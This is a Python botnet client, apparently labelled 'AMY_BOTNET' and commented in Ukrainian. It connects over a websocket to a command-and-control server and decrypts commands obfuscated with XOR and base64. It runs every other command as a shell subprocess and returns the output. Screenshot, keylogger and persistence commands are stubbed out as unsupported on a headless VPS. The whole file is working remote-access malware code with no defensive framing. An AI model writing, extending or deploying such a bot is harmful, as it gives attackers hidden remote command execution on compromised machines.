import asyncio
import websockets
import base64
import sys
import os

# Конфігурація
BOT_ID = sys.argv[1] if len(sys.argv) > 1 else "vps-test-bot"
SERVER_URL = f"ws://127.0.0.1:8000/ws/{BOT_ID}"
KEY = b"AMY_BOTNET_2026_SECRET_KEY_1337"

def encrypt_message(msg: str) -> str:
    encrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(msg.encode('utf-8'))])
    return base64.b64encode(encrypted).decode('utf-8')

def decrypt_message(encoded: str) -> str:
    try:
        encrypted = base64.b64decode(encoded)
        decrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(encrypted)])
        return decrypted.decode('utf-8', errors='ignore')
    except:
        return encoded

async def run_bot():
    print(f"[*] Starting VPS Lite Bot: {BOT_ID}")
    print(f"[*] Connecting to {SERVER_URL}...")
    
    try:
        # origin=None допомагає уникнути 403 помилки
        async with websockets.connect(SERVER_URL, origin=None) as websocket:
            print("[+] Connected successfully!")

            while True:
                # Отримуємо зашифровану команду від сервера
                encrypted_command = await websocket.recv()
                command = decrypt_message(encrypted_command)
                
                print(f"[*] Received command: {command}")

                if command == "screenshot":
                    response = "SCREENSHOT: (Not available on VPS)"
                    await websocket.send(encrypt_message(response))
                
                elif command == "keylogger":
                    response = "KEYLOG: (Keylogger not supported on headless VPS)"
                    await websocket.send(encrypt_message(response))
                
                elif command == "persistence":
                    await websocket.send(encrypt_message("Persistence: Not supported on Linux VPS"))
                
                else:
                    # Виконання консольних команд (Shell)
                    try:
                        proc = await asyncio.create_subprocess_shell(
                            command,
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE
                        )
                        stdout, stderr = await proc.communicate()
                        output = (stdout.decode() + stderr.decode()).strip()
                        await websocket.send(encrypt_message(output or "Command executed."))
                    except Exception as e:
                        await websocket.send(encrypt_message(f"Error: {str(e)}"))

    except Exception as e:
        print(f"[!] Connection error: {e}")

if __name__ == "__main__":
    asyncio.run(run_bot())
